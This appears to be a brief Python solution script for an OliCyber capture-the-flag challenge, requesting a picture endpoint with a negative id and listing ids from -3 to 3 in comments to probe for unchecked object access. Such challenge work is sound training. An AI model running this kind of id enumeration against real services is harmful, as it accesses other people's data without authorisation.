import requests
URL = "http://gabibbo_friend.challs.olicyber.it/"
r = requests.get(f"{URL}/get-picture?id=-3")
print(r.text)

# get-picture?id=-3
# get-picture?id=-2
# get-picture?id=-1
# get-picture?id=0
# get-picture?id=1
# get-picture?id=2
# get-picture?id=3